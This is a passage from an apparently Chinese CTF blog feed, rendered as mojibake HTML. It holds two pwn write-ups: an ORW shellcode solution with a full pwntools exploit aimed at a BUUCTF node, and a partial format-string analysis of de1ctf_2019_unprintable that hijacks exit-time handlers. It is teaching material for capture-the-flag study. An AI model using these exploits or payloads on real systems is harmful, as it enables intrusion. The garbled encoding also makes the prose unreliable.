class="number">0x50</span>)<span class="comment">#ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯3ï¼Œå› ä¸ºä¸€ä¸ªè¿›ç¨‹æœ‰é»˜è®¤çš„æ–‡ä»¶æè¿°ç¬¦0,1,2ã€‚å½“å†æ‰“å¼€æ–°çš„æ–‡ä»¶ä¹‹åï¼Œæ–‡ä»¶æè¿°ç¬¦å°±ä¼šä»¥æ­¤ç±»æ¨çš„åˆ†é…ï¼Œå› æ­¤ä¸Šé¢openæ–°æ‰“å¼€çš„flagæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦å°±æ˜¯3</span></span><br><span class="line"><span class="comment">#è‡³äºè¿™ä¸ªaddrï¼ŒæŠŠè¯»å‡ºæ¥çš„flagæ”¾åˆ°å“ªï¼Œä¸€ä¼šå†è¯´</span></span><br><span class="line">write(<span class="number">1</span>,addr,<span class="number">0x50</span>)</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œå°±å¼€å§‹ç”¨æ±‡ç¼–æ¥å®ç°ä¸Šé¢çš„å†…å®¹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">open(flag_addr,0)</span><br><span class="line">push 0x67616c66</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">#ä¸Šé¢è¿™ä¸¤æ­¥å°±æ˜¯åœ¨ä¼ opençš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œè¿™ä¸ªå‚æ•°è¦æ˜¯ä¸€ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€è¦æŒ‡å‘å­—ç¬¦ä¸²&#x27;flag&#x27;</span><br><span class="line">#æ‰§è¡Œå®Œpush 0x67616c66çš„æ—¶å€™ï¼Œæ ˆé¡¶çš„å†…å®¹å°±æ˜¯å­—ç¬¦ä¸²flagï¼Œè€Œæ ˆé¡¶æŒ‡é’ˆrspå°±æŒ‡å‘äº†è¿™ä¸ªflagï¼Œæ­¤æ—¶æ‰§è¡Œpush rspå°†æŒ‡å‘flagçš„åœ°å€ï¼ˆä¹Ÿå°±æ˜¯rspï¼‰å‹æ ˆï¼Œæ­¤æ—¶æ ˆé¡¶çš„å†…å®¹å°±æ˜¯é‚£ä¸ªæŒ‡å‘flagçš„åœ°å€ï¼Œç„¶åå†æ‰§è¡Œpop rdi</span><br><span class="line">#å°†æ ˆé¡¶çš„è¿™ä¸ªå†…å®¹å¼¹ç»™rdiï¼Œæ­¤æ—¶opençš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æˆä¸ºäº†æŒ‡å‘flagçš„åœ°å€</span><br><span class="line">push 0#è¿™ä¸ªpush 0è¿™é‡Œå°±ä¼šå‡ºç°æœºå™¨ç 00ï¼Œç”¨æ¥æˆªæ–­strlenå‡½æ•°</span><br><span class="line">pop rsi</span><br><span class="line">push 2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">read(3,addr,0x50)</span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push rsp </span><br><span class="line">pop rsi</span><br><span class="line">#ä¸Šé¢è¿™ä¸¤æ­¥åœ¨å®Œæˆreadå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ä¼ å‚ï¼Œæ­¤æ—¶å‹å…¥æ ˆçš„rspï¼Œæˆ‘å¹¶ä¸çŸ¥é“è¿™ä¸ªåœ°å€æ˜¯ä»€ä¹ˆï¼ŒåªçŸ¥é“æŠŠè¿™ä¸ªåœ°å€ç»™rsiçš„è¯ï¼Œflagå°±ä¼šè¢«å†™åˆ°è¿™ä¸ªåœ°å€é‡Œé¢ï¼Œè‡³äºè¿™ä¸ªåœ°å€æ˜¯ä»€ä¹ˆï¼ŒçœŸçš„ä¸é‡è¦ï¼Œé‡è¦çš„æ˜¯è¦ä¿è¯æ¥ä¸‹æ¥writeçš„ç¬¬äºŒä¸ªå‚æ•°ä¹Ÿæ˜¯è¿™ä¸ªåœ°å€å³å¯ï¼Œè€Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯ä¿è¯æ¥ä¸‹æ¥çš„æ¯ä¸€ä¸ªpushéƒ½è¦å¯¹åº”ä¸€ä¸ªpopï¼Œè¿™æ ·æ ˆé¡¶å§‹ç»ˆå°±æ˜¯ç»™å½“åˆrsiçš„é‚£ä¸ªåœ°å€äº†ã€‚</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 0</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">write(1,addr,0x50)</span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line">#è¿™ä¸ªåœ°æ–¹çš„push rsp pop rsiåŸç†åŒä¸Š</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="EXPï¼š"><a href="#EXPï¼š" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h2><p>æœ€åè„šæœ¬çš„è¯æœ‰ä¸€ç‚¹è¦æ³¨æ„ä¸€ä¸‹ã€‚</p><p><img src="/../img/2706180-20220405154632624-1550577273.png"></p><p>è¿™ä¸ªåœ°æ–¹æœ‰ä¸€ä¸ªæŒ‡ä»¤ï¼Œå®ƒå°†æŠŠæˆ‘ä»¬è¾“å…¥çš„payloadçš„æœ€åä¸€å­—èŠ‚æ”¹æˆ0ã€‚ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><p><img src="/../img/2706180-20220405154644353-718454188.png"><br><img src="/../img/2706180-20220405154653289-1949378506.png"></p><p>è¿™æ ·çš„åæœå°±æ˜¯å°†æˆ‘ä»¬çš„shellcodeæœ€åä¸€ä¸ªsyscallç»™ç ´åäº†ï¼Œå› æ­¤æˆ‘ä»¬åœ¨syscallåé¢éšä¾¿å†å†™ä¸ªæŒ‡ä»¤ï¼Œsyscallå°±æ˜¯å®Œæ•´çš„äº†ã€‚</p><p>æœ€åexpï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28435</span>)</span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 3</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220405154703410-2032422839.png"></p>]]></content>
      
      
      <categories>
          
          <category> buuåˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> orw </tag>
            
            <tag> æ²™ç®±é€ƒé€¸ </tag>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF_de1ctf_2019_unprintable</title>
      <link href="/posts/d34ee684.html"/>
      <url>/posts/d34ee684.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><blockquote><p>é€šè¿‡è¿™é“é¢˜çš„å­¦ä¹ ä¸æ”¶è·æœ‰ï¼š</p><p>1ã€bssæ®µçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œéœ€è¦æ‰¾ä¸€æ¡æ ˆé“¾ï¼Œéœ€è¦ç”¨æ ˆåœ°å€-&gt;æ ˆåœ°å€-&gt;æ ˆåœ°å€-&gt;å€¼ï¼Œç”¨ç¬¬äºŒä¸ªæ ˆåœ°å€æ¥æ§åˆ¶ç¬¬ä¸‰ä¸ªæ ˆåœ°å€ï¼Œå°†ç¬¬ä¸‰ä¸ªæ ˆåœ°å€å½“åšè·³æ¿ï¼Œæœ€ç»ˆå»é€šè¿‡è·³æ¿çš„ä¸æ–­ç§»åŠ¨ï¼Œå»ä¸æ–­å†™å…¥ä¸€æˆ–ä¸¤å­—èŠ‚çš„æ•°æ®ã€‚<br>è¿™é‡Œç¨ç¨æ€»ç»“ä¸¤å¥ã€‚<br>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦æ¼æ´æ¥è¾¾åˆ°å†™çš„ç›®çš„ï¼Œåˆ†ä¸ºä¸¤ç§æƒ…å†µã€‚<br>å¦‚æœè¾“å…¥ç›´æ¥æ˜¯åœ¨æ ˆä¸­ï¼Œé‚£å°±å¯ä»¥å»åˆ©ç”¨è·æ ˆé¡¶åç§»åŠ æˆ‘ä»¬æ„é€ åœ°å€ï¼Œå»è¾¾åˆ°ä»»æ„åœ°å€ä»»æ„å†™çš„ç›®çš„ã€‚<br>å¦‚æœè¾“å…¥æ˜¯åœ¨bssæ®µï¼Œé‚£ä¹ˆè¦åˆ©ç”¨æ ˆé“¾ï¼Œæ¥è¿›è¡Œä»»æ„åœ°å€ä»»æ„å†™ã€‚</p></blockquote><blockquote><p>2ã€è¿™é“é¢˜çš„æ€è·¯æ˜¯ä¸€è¾¹åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å»ä¸æ–­æ‰§è¡Œprintfå’Œreadï¼Œä¸€è¾¹åœ¨æ ˆé‡Œå†™å…¥bssæ®µåœ°å€ï¼Œä¸ºä¹‹åçš„æ ˆè¿ç§»åšæ‰“ç®—ã€‚æœ€åå°†å¸ƒç½®å¥½çš„ropé“¾å‘é€è¿‡å»ï¼Œè®©æ‰§è¡Œæµè¿ç§»åˆ°ropé“¾ä¸Šï¼Œåˆ©ç”¨magic gadgetæ¥è·å–shellã€‚</p><p>3ã€åˆæ”¶é›†åˆ°äº†ä¸€ä¸ªæ–°çš„magic gadgetã€‚adc    DWORD PTR [rbp+0x48],edx    æœºå™¨ç æœ11554889</p><p>4ã€ç¬¬ä¸€æ¬¡é‡è§æ ¼å¼åŒ–å­—ç¬¦å‡½æ•°è‡ªå·±ä¿®æ”¹è‡ªå·±çš„è¿”å›åœ°å€å»æ‰§è¡Œè‡ªå·±â€¦ å¦å¤–å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦å¹¶ä¸éœ€è¦å¯¹é½ï¼Œæ ¼å¼åŒ–å­—ç¬¦åé¢çš„åœ°å€æ‰éœ€è¦å¯¹é½ã€‚</p><p>5ã€å¤šæ³¨æ„æ ˆé‡Œçš„æ•°æ®ï¼Œæ˜¯å¦æœ‰ç‰¹æ®Šçš„å­˜åœ¨ã€‚æ²¡æ€è·¯çš„æ—¶å€™ï¼Œå°±è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹èƒ½ä¸èƒ½æ‰¾åˆ°æœ‰ç”¨çš„ä¿¡æ¯ã€‚</p></blockquote><h2 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h2><p><img src="/../img/2706180-20220419222501934-1369976080.png"></p><h2 id="ç¨‹åºåˆ†æï¼š"><a href="#ç¨‹åºåˆ†æï¼š" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h2><p><img src="/../img/2706180-20220419222530244-1699956812.png"></p><p>ç¨‹åºå¾ˆçŸ­ï¼Œè¿™é¢˜å¾ˆç®€å•ï¼Ÿ</p><p>hhï¼Œç»§ç»­å¾€ä¸‹çœ‹å§ã€‚</p><p>ç¨‹åºå°±å››ä¸ªç‚¹ï¼Œç¬¬ä¸€æ˜¯ç¨‹åºè‡ªå·±æ³„éœ²ä¸ªæ ˆåœ°å€</p><p>ç¬¬äºŒæ˜¯closeå…³é—­äº†æ ‡å‡†è¾“å‡ºï¼Œå¦‚æœä¸è¿‡ä»…ä»…æ˜¯å…³é—­äº†ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œåªè¦èƒ½è·å–shellçš„è¯ï¼Œé‡å®šå‘ä¸€ä¸‹æ–‡ä»¶æè¿°ç¬¦å°±okäº†ã€‚</p><p>ç¬¬ä¸‰æ˜¯æœ‰ä¸ªæ ¼å¼åŒ–å­—ç¬¦æ¼æ´çš„ç‚¹ï¼ŒåŒæ—¶è¿™é“é¢˜æº¢å‡ºç»™çš„è¶…å¤§ï¼ˆå¹¶ä¸”æ˜¯è¾“å…¥åˆ°bssæ®µï¼‰ã€‚</p><p>ç¬¬å››æ˜¯ç¨‹åºæ²¡æœ‰returnï¼Œæ ¼å¼åŒ–å­—ç¬¦å‡½æ•°åˆ©ç”¨å®Œä¹‹åï¼Œç¨‹åºå°±exitäº†ã€‚</p><p>é¦–å…ˆçŒœæµ‹æ³„éœ²çš„æ ˆåœ°å€åº”è¯¥æ˜¯è¦é…åˆæ ¼å¼åŒ–å­—ç¬¦å‡½æ•°ä½¿ç”¨çš„ï¼Œcloseåªå…³é—­äº†ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œåªè¦èƒ½è·å–shellçš„è¯ï¼Œè¿™ä¸ªç‚¹ä¹Ÿå¥½å¤„ç†ã€‚æœ€å›°éš¾çš„ç‚¹æ˜¯printåé¢ç´§æ¥ç€å°±æ˜¯exitäº†ï¼Œå› æ­¤å»ç”¨printæ¥ä¿®æ”¹mainå‡½æ•°çš„è¿”å›åœ°å€ä»¥åŠ«æŒæ‰§è¡Œæµè‚¯å®šæ˜¯è¡Œä¸é€šçš„äº†ï¼Œè‡³æ­¤å¡æ­»â€¦</p><h2 id="å°è¯•ä¸€ä¸‹è°ƒè¯•"><a href="#å°è¯•ä¸€ä¸‹è°ƒè¯•" class="headerlink" title="å°è¯•ä¸€ä¸‹è°ƒè¯•"></a>å°è¯•ä¸€ä¸‹è°ƒè¯•</h2><h3 id="å…ˆpatchä¸€ä¸‹"><a href="#å…ˆpatchä¸€ä¸‹" class="headerlink" title="å…ˆpatchä¸€ä¸‹"></a>å…ˆpatchä¸€ä¸‹</h3><p>å…ˆpatchä¸€ä¸‹libcå’Œldï¼Œè¿™é“é¢˜æ˜¯2.23çš„libcï¼ŒæŸ¥çœ‹æ–¹æ³•å¦‚ä¸‹ã€‚</p><p><img src="/../img/2706180-20220419222544382-1860213709.png"></p><p><img src="/../img/2706180-20220419222604821-2028299225.png"></p><p><img src="/../img/2706180-20220419222623038-343280554.png"></p><p>ç„¶åä¸‹è½½å¯¹åº”çš„libcï¼Œpatchä¸€ä¸‹å³å¯ã€‚ï¼ˆè¿™é“é¢˜æˆ‘çœ‹äº†ä¸€ä¸‹å‘ç°æ˜¯2.23çš„ï¼Œå°±ç›´æ¥ç”¨glibc-all-in-oneé‡Œçš„2.23libcäº†ï¼Œç»“æœæœ€åå¯¼è‡´å°ç‰ˆæœ¬ä¸åŒï¼Œæœ¬åœ°æ‰“é€šäº†ï¼Œè¿œç¨‹æ²¡é€šï¼Œå› æ­¤ä¸‹å›ç›´æ¥patch buuä¸Šç»™çš„libcå³å¯ï¼‰</p><p><a href="(https://www.cnblogs.com/ZIKH26/articles/16044588.html)">å¦‚ä½•patchï¼Œæˆ‘è¿™ç¯‡åšå®¢æœ‰æåˆ°</a></p><h3 id="åˆæ­¥è°ƒè¯•"><a href="#åˆæ­¥è°ƒè¯•" class="headerlink" title="åˆæ­¥è°ƒè¯•"></a>åˆæ­¥è°ƒè¯•</h3><p>é¦–å…ˆæ˜ç¡®ä¸€ä¸‹æˆ‘ä»¬æƒ³çœ‹ä»€ä¹ˆï¼Œæˆ‘ä»¬ç°åœ¨ä»€ä¹ˆä¹Ÿä¸çŸ¥é“ï¼Œä½†æ˜¯æ‰“ç®—å»çœ‹ä¸€ä¸‹æ ˆé‡Œçš„æƒ…å†µç¢°ç¢°è¿æ°”<strong>ï¼ˆæ ˆä¸­æƒ…å†µå¦‚ä¸‹ï¼‰</strong>ã€‚ä¸è¿‡æ ¼å¼åŒ–å­—ç¬¦å‡½æ•°ä¹‹å‰çš„æ ˆä¸€å¾‹ä¸ç”¨çœ‹ï¼ˆå› ä¸ºæˆ‘ä»¬åˆ©ç”¨ä¸äº†ï¼‰ã€‚</p><p>åŸºæœ¬ä¸Šæ„Ÿè§‰çœ‹ä¸å‡ºæ¥ä»€ä¹ˆï¼Œå¦‚æœéè¦è¯´ä¸ªä¸ä¸€æ ·çš„ï¼Œé‚£å°±å‘ç°æœ‰ä¸ªæ ˆé‡Œçš„å†…å®¹é¢œè‰²å’Œå…¶ä»–çš„ä¸ä¸€æ ·ã€‚ï¼ˆæ­¤æ—¶æ˜¯å³å°†æ‰§è¡Œæ ¼å¼åŒ–å­—ç¬¦å‡½æ•°æ—¶ï¼‰</p><p><img src="/../img/2706180-20220419222641908-41446843.png"></p><p>ç”¨vmmapçœ‹ä¸€ä¸‹ï¼Œå‘ç°è¿™ä¸ªåœ°å€æ˜¯ä½äºld.soä¸­çš„ï¼Œè¿™ä¸ªåœ°å€æœ‰ç‚¹å¥‡æ€ªï¼Œä¸è¿‡ä¾ç„¶ä¸çŸ¥é“è¿™é‡Œæœ‰ä»€ä¹ˆç”¨ã€‚</p><p><img src="/../img/2706180-20220419222652607-1470036751.png"></p><p>ä¸è¿‡æ ¹æ®ç»éªŒæ¥çœ‹ï¼Œä¼¼ä¹æ˜¯è¦åŠ«æŒexité‡Œçš„æŸä¸ªhookï¼Ÿå› ä¸ºä¹‹å‰ä¹Ÿé‡è§è¿‡ä¸€é“ç±»ä¼¼è¿™ç§æ‰‹æ³•çš„é¢˜ç›®ã€‚</p><p>siè¿›å…¥exité‡Œé¢çœ‹çœ‹ã€‚</p><p>ç»è¿‡æ¼«é•¿çš„siä¹‹åï¼Œç»ˆäºåœ¨dl_fini+250å¤„æ‰§è¡Œä¹‹åï¼Œæ­¤æ—¶çš„æ ˆé‡Œï¼Œå±…ç„¶å‡ºç°äº†åˆšæ‰çš„é‚£ä¸ªå¥‡æ€ªåœ°å€<strong>ï¼ˆæ ˆä¸­æƒ…å†µå¦‚ä¸‹ï¼‰</strong></p><p><img src="/../img/2706180-20220419222710108-373516738.png"></p><p>ç»§ç»­åˆsiäº†å¾ˆä¹…ï¼Œå‘ç°æ­¤æ—¶calläº†ä¸€ä¸‹ï¼Œæˆ‘ä»¬æº¯æºä¸€ä¸‹r12å¯„å­˜å™¨çš„å€¼ï¼ˆrdxå°±ä¸ç”¨ç®¡äº†ï¼Œå› ä¸ºæœ¬èº«è‡ªå·±å°±ä¸º0äº†ï¼‰ã€‚</p><p><img src="/../img/2706180-20220419221014598-2091139831.png" alt="image-20220419094811717"></p><p>å¾€ä¸Šç¿»äº†å‡ æ­¥å‘ç°ï¼Œr12çš„å€¼æ˜¯è‡ªèº«çš„å€¼åŠ ä¸Šäº†rbxæ‰€æŒ‡å‘çš„å†…å®¹ã€‚(æˆ‘ä»¬å¯ä»¥æ§åˆ¶rbxæ‰€æŒ‡å‘çš„å†…å®¹ï¼Œä½†æ˜¯æ§åˆ¶ä¸äº†åŸæœ¬çš„r12)</p><p><img src="/../img/2706180-20220419221013949-678030322.png" alt="image-20220419095011665"></p><h3 id="è§£å†³exitçš„é€€å‡ºé—®é¢˜"><a href="#è§£å†³exitçš„é€€å‡ºé—®é¢˜" class="headerlink" title="è§£å†³exitçš„é€€å‡ºé—®é¢˜"></a>è§£å†³exitçš„é€€å‡ºé—®é¢˜</h3><h4 id="é‡æ–°æ¢³ç†ä¸€ä¸‹å½“å‰ä¿¡æ¯ï¼š"><a href="#é‡æ–°æ¢³ç†ä¸€ä¸‹å½“å‰ä¿¡æ¯ï¼š" class="headerlink" title="é‡æ–°æ¢³ç†ä¸€ä¸‹å½“å‰ä¿¡æ¯ï¼š"></a>é‡æ–°æ¢³ç†ä¸€ä¸‹å½“å‰ä¿¡æ¯ï¼š</h4><p>1ã€æ ˆé‡Œæœ‰ä¸ªä½äºld.soä¸­çš„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¿®æ”¹è¿™ä¸ªåœ°å€æ‰€æŒ‡å‘çš„å€¼ï¼ˆä½†æ˜¯ä¿®æ”¹ä¸äº†è¿™ä¸ªä½äºld.soåœ°å€ï¼‰ã€‚<strong>ï¼ˆå› ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æƒ³è¦ä¿®æ”¹æŸä¸ªå€¼ï¼Œå°±å¿…é¡»å»æ‰¾åˆ°æŒ‡å‘è¿™ä¸ªå€¼çš„åœ°å€åˆ©ç”¨ç›¸å¯¹æ ˆé¡¶åç§»å®Œæˆä¿®æ”¹ï¼‰</strong>ã€‚</p><p>2ã€ç¨‹åºæœ€åè°ƒç”¨äº†<code>exit</code>ä¸­çš„<code>__run_exit_handlers</code>å‡½æ•°ä¸­çš„<code>_dl_fini</code>ä¸­çš„ä¸€ä¸ªcall ptr[r12+rdx*8]   è€Œr12å°±æ˜¯é‚£ä¸ª**ä½äºld.soä¸­çš„åœ°å€æ‰€æŒ‡å‘çš„å€¼(ä¸ä¿®æ”¹çš„è¯ï¼Œé»˜è®¤ä¸º0)**åŠ äº†0x600dd8ã€‚</p><h4 id="æˆ‘ä»¬å½“ä¸‹çš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#æˆ‘ä»¬å½“ä¸‹çš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="æˆ‘ä»¬å½“ä¸‹çš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿ"></a>æˆ‘ä»¬å½“ä¸‹çš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿ</h4><p>åŠ«æŒç¨‹åºæ‰§è¡Œæµï¼Œä¸è®©å…¶è§¦å‘exitå¯¼è‡´ç¨‹åºç»“æŸï¼Œå¹¶ä¸”è®©æ‰§è¡Œæµå»é‡æ–°æ‰§è¡Œreadä»¥åŠprintfï¼ˆä¸èƒ½è¿”å›åˆ°mainå‡½æ•°ï¼Œä¸ç„¶ä¼šé‡æ–°åˆå§‹åŒ–æ ˆç©ºé—´ï¼‰ï¼Œå› ä¸ºç¨‹åºçš„æ¼æ´ç‚¹åªæœ‰è¿™ä¸€ä¸ªï¼Œå› æ­¤åªèƒ½åŠ«æŒåˆ°è¿™é‡Œã€‚</p><h4 id="æ€ä¹ˆåšï¼Ÿ"><a href="#æ€ä¹ˆåšï¼Ÿ" class="headerlink" title="æ€ä¹ˆåšï¼Ÿ"></a>æ€ä¹ˆåšï¼Ÿ</h4><p>ç”±äºcallåé¢åŠ äº†ä¸ªptrï¼Œå› æ­¤r12æœ€åçš„å€¼åº”è¯¥è®©å®ƒå»æŒ‡å‘è¿™é‡Œ<br><img src="/../img/2706180-20220419222836279-1337151327.png"></p><p>é‡‡ç”¨ç­–ç•¥æ˜¯å°†0x4007A3å¸ƒç½®åˆ°bssæ®µï¼Œç„¶åè®©r12çš„å€¼ä¸ºæŒ‡å‘0x4007A3çš„åœ°å€(ä¹Ÿå°±æ˜¯bssæ®µåœ°å€)ã€‚</p><h4 id="å¯¹åº”payload"><a href="#å¯¹åº”payload" class="headerlink" title="å¯¹åº”payload"></a>å¯¹åº”payload</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x298</span>)+<span class="string">&#x27;c%26$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(read_print_addr)<span class="comment">#è¿™ä¸ªåœ°å€è¦æ”¾åœ¨æœ€åï¼Œå¦‚æœæ”¾åœ¨payloadæœ€å¼€å§‹</span></span><br><span class="line"><span class="comment">#p64æ‰“åŒ…äº§ç”Ÿçš„00ä¼šå°†æ ¼å¼åŒ–å­—ç¬¦å‡½æ•°æˆªæ–­ï¼Œå¯¼è‡´åé¢å¸ƒç½®çš„æ ¼å¼åŒ–å­—ç¬¦æ— æ³•è¢«è§£æ</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><p>å…³äºpayloadè§£é‡Šå¦‚ä¸‹</p><p><img src="/../img/2706180-20220419222849072-1784896764.png"></p><p>æ­¤å¤„è·ç¦»æ ˆé¡¶åç§»20ï¼Œå†åŠ ä¸Š6ä¸ªå¯„å­˜å™¨ï¼Œåç§»ä¸º26ã€‚</p><p>payloadä»0x601060å¼€å§‹è¾“å…¥ï¼ŒæŠŠæ ¼å¼åŒ–å­—ç¬¦éƒ¨åˆ†å¡«å……ä¸º16ä¸ªå­—èŠ‚ï¼Œå› æ­¤0x601070è£…çš„æ˜¯0x4007A3ã€‚<strong>åœ¨__dl__finiä¸­æ‰§è¡Œaddçš„æ—¶å€™r12åŸæœ¬çš„å€¼ä¸º0x600dd8</strong>ã€‚å› æ­¤éœ€è¦å°†rbxæ‰€æŒ‡å‘çš„å€¼ä¿®æ”¹ä¸º0x298(0x601070-0x600dd8) ï¼Œè¿™æ ·æ‰èƒ½è®©æœ€åcallçš„æ—¶å€™r12ä¸º0x601070ã€‚</p><h3 id="å¦‚ä½•å¤šæ¬¡ä»»æ„å†™ï¼Ÿ"><a href="#å¦‚ä½•å¤šæ¬¡ä»»æ„å†™ï¼Ÿ" class="headerlink" title="å¦‚ä½•å¤šæ¬¡ä»»æ„å†™ï¼Ÿ"></a>å¦‚ä½•å¤šæ¬¡ä»»æ„å†™ï¼Ÿ</h3><p>ç°åœ¨ç¡®å®æ˜¯åˆè¿”å›åˆ°äº†readå‡½æ•°ï¼Œæˆ‘ä»¬çš„æ€è·¯åº”è¯¥æ˜¯å†™ä¸ªropé“¾åœ¨bssæ®µï¼Œç„¶åæƒ³åŠæ³•è®©æ‰§è¡Œæµè¿ç§»è¿‡å»ã€‚å…·ä½“ç»†èŠ‚å…ˆä¸æƒ³é‚£ä¹ˆå¤šï¼Œä½†æ˜¯ä¸€æ¬¡printfè‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œé‚£æ€ä¹ˆåŠï¼Ÿå…‰æƒ³çš„è¯ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆåŠâ€¦    é‚£å°±ç»§ç»­è°ƒè¯•ï¼Œçœ‹çœ‹æ­¤æ—¶æ ˆé‡Œæœ‰æ²¡æœ‰å¯ç”¨åˆ©ç”¨çš„åœ°æ–¹</p><p><img src="/../img/2706180-20220419222914265-1836923816.png"></p><p>å¯ä»¥å‘ç°æ ˆé‡Œæ­¤æ—¶å¤šäº†å¾ˆå¤šæŒ‡å‘æ ˆæœ¬èº«çš„æŒ‡é’ˆï¼Œæœ€å€¼å¾—å…³æ³¨çš„æ˜¯çº¢æ¡†çš„é‚£ä¸ªåœ°æ–¹ã€‚è¿™ä¸ªæ ˆåœ°å€æ˜¯æŒ‡å‘å½“å‰æ ˆé¡¶çš„ä¸Šä¸€ä¸ªå†…å­˜å•å…ƒï¼Œè¿™æ„å‘³ç€å¦‚æœæ‰§è¡Œprintfçš„è¯ï¼Œé‚£printfçš„è¿”å›åœ°å€å°†è¢«å­˜æ”¾åˆ°è¿™ä¸ªå†…å­˜å•å…ƒï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><p><img src="/../img/2706180-20220419222930128-970393783.png"></p><p>æ­¤æ—¶çš„è¿™ä¸ª0x4007c6å°±æ˜¯printfçš„è¿”å›åœ°å€äº†ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥â€¦ <strong>ç”¨printfä¿®æ”¹printfçš„è¿”å›åœ°å€ä»¥ä¾¿è®©æ‰§è¡Œæµç»§ç»­æ‰§printf</strong>ï¼ï¼</p><p>ï¼ˆè¿™ä¸ªæƒ³æ³•å¬èµ·æ¥æœ‰ç‚¹å°ç–¯ç‹‚ï¼Œä½†æ˜¯ç¡®å®å¯ä»¥å®ç°ï¼Œ<strong>è¿™æ ·åšçš„å‰ææ˜¯æ 